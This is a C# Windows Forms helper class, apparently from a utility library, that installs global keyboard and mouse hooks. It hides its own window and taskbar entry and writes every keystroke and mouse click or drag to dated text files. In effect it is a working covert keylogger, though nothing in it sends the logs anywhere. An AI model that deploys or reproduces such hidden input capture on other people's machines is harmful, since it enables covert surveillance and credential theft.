using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Utils.Helper.TXT;

namespace Utils.Helper.HookProc
{
    /// <summary>
    /// 记录电脑操作窗体(不显示界面)
    /// 创建日期:2017年6月9日
    /// </summary>
    public partial class RecordOperation : Form
    {
        private readonly KeyboardHookListener m_KeyboardHookManager;
        private readonly MouseHookListener m_MouseHookManager;

        /// <summary>
        /// 获取键盘状态
        /// </summary>
        /// <param name="pbKeyState">指向一个256字节的数组,数组用于接收每个虚拟键的状态.</param>
        /// <returns>若函数调用成功,则返回非0值.若函数调用不成功,则返回值为0.若要获得更多的错误信息,可以调用GetLastError函数</returns>
        [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
        public static extern int GetKeyboardState(byte[] pbKeyState);

        /// <summary>
        /// 大写锁定状态
        /// </summary>
        public static bool CapsLockStatus
        {
            get
            {
                byte[] bs = new byte[256];
                GetKeyboardState(bs);
                return (bs[0x14] == 1);
            }
        }

        /// <summary>
        /// 鼠标当前X坐标
        /// </summary>
        string strCurrentMouseX { get; set; }
        /// <summary>
        /// 鼠标当前Y坐标
        /// </summary>
        string strCurrentMouseY { get; set; }

        /// <summary>
        /// 鼠标按下时X坐标
        /// </summary>
        string strMouseDownMouseX { get; set; }
        /// <summary>
        /// 鼠标按下时Y坐标
        /// </summary>
        string strMouseDownMouseY { get; set; }

        public RecordOperation()
        {
            InitializeComponent();
            m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker());
            m_KeyboardHookManager.Enabled = true;

            m_MouseHookManager = new MouseHookListener(new GlobalHooker());
            m_MouseHookManager.Enabled = true;
        }

        private void RecordOperation_Load(object sender, EventArgs e)
        {
            //键盘按键
            m_KeyboardHookManager.KeyDown += HookManager_KeyDown;
            //键盘按下
            //m_KeyboardHookManager.KeyPress += HookManager_KeyPress;
            //键盘弹起
            //m_KeyboardHookManager.KeyUp += HookManager_KeyUp;
            //鼠标移动
            m_MouseHookManager.MouseMove += HookManager_MouseMove;
            //鼠标点击
            m_MouseHookManager.MouseClickExt += HookManager_MouseClick;
            //鼠标按下
            m_MouseHookManager.MouseDown += HookManager_MouseDown;
            //鼠标弹起
            m_MouseHookManager.MouseUp += HookManager_MouseUp;
            //鼠标双击
            m_MouseHookManager.MouseDoubleClick += HookManager_MouseDoubleClick;
            //鼠标中间滑轮
            //m_MouseHookManager.MouseWheel += HookManager_MouseWheel;
            //隐藏WinForm窗体
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            SetVisibleCore(false);
        }

        /// <summary>
        /// 键盘按键
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            RecordOperationLogs(string.Format("KeyDown:\t\t{0}", e.KeyCode));
            //单独保存键盘按键日志
            if (string.Format("{0}", e.KeyCode).Length <= 1)
            {
                if (CapsLockStatus == true)
                {
                    KeyboardOperationLogs(string.Format("{0}", e.KeyCode).ToUpper());
                }
                else
                {
                    KeyboardOperationLogs(string.Format("{0}", e.KeyCode).ToLower());
                }
            }
            else
            {
                KeyboardOperationLogs(string.Format("({0})", e.KeyCode));
            }
        }

        /// <summary>
        /// 键盘按下
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            RecordOperationLogs(string.Format("KeyPress:\t\t{0}", e.KeyChar));
        }

        /// <summary>
        /// 键盘弹起
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_KeyUp(object sender, KeyEventArgs e)
        {
            RecordOperationLogs(string.Format("KeyUp:\t\t{0}", e.KeyCode));
        }

        /// <summary>
        /// 鼠标移动
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseMove(object sender, MouseEventArgs e)
        {
            strCurrentMouseX = string.Format("x={0:0000}", e.X);
            strCurrentMouseY = string.Format("y={0:0000}", e.Y);
        }

        /// <summary>
        /// 鼠标点击
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseClick(object sender, MouseEventArgs e)
        {
            RecordOperationLogs(string.Format("MouseClick:\t\t{0}\t{1}", e.Button, strCurrentMouseX + "." + strCurrentMouseY));
        }

        /// <summary>
        /// 鼠标按下
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseDown(object sender, MouseEventArgs e)
        {
            strMouseDownMouseX = strCurrentMouseX;
            strMouseDownMouseY = strCurrentMouseY;
        }

        /// <summary>
        /// 鼠标弹起
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseUp(object sender, MouseEventArgs e)
        {
            if (strMouseDownMouseX != strCurrentMouseX || strMouseDownMouseY != strCurrentMouseY)
            {
                RecordOperationLogs(string.Format("MouseDrag:\t\t{0}\t{1}", e.Button, strMouseDownMouseX + "." + strMouseDownMouseY + "----" + strCurrentMouseX + "." + strCurrentMouseY));
            }
        }

        /// <summary>
        /// 鼠标双击
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            RecordOperationLogs(string.Format("MouseDoubleClick:\t{0}\t{1}", e.Button, strCurrentMouseX + "." + strCurrentMouseY));
        }

        /// <summary>
        /// 鼠标中间滑轮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HookManager_MouseWheel(object sender, MouseEventArgs e)
        {
            RecordOperationLogs(string.Format("Wheel={0:000}", e.Delta));
        }

        /// <summary>
        /// RecordOperation日志文件
        /// </summary>
        /// <param name="strLogs">异常信息</param>
        private static void RecordOperationLogs(string strLogs)
        {
            string strDate = DateTime.Now.ToString("yyyy-MM-dd");
            string strDateTime = DateTime.Now.ToString();
            string strFolderPath = string.Format("{0}\\RecordOperation", System.Environment.CurrentDirectory);
            string strFilePath = string.Format("{0}\\RecordOperation\\{1}RecordOperation.txt", System.Environment.CurrentDirectory, strDate);
            if (!File.Exists(strFilePath))
            {
                TXTHelper.AppendFile(strFilePath, string.Format("{0}:{1}", strDateTime, strLogs), false);
            }
            else
            {
                TXTHelper.AppendFile(strFilePath, string.Format("{0}:{1}", strDateTime, strLogs), true);
            }
        }

        /// <summary>
        /// KeyboardOperation日志文件
        /// </summary>
        /// <param name="strLogs">异常信息</param>
        private static void KeyboardOperationLogs(string strLogs)
        {
            string strDate = DateTime.Now.ToString("yyyy-MM-dd");
            string strDateTime = DateTime.Now.ToString();
            string strFolderPath = string.Format("{0}\\RecordOperation", System.Environment.CurrentDirectory);
            string strFilePath = string.Format("{0}\\RecordOperation\\{1}KeyboardOperation.txt", System.Environment.CurrentDirectory, strDate);
            TXTHelper.AppendFile(strFilePath, string.Format("{0}", strLogs), false);
        }
    }
}
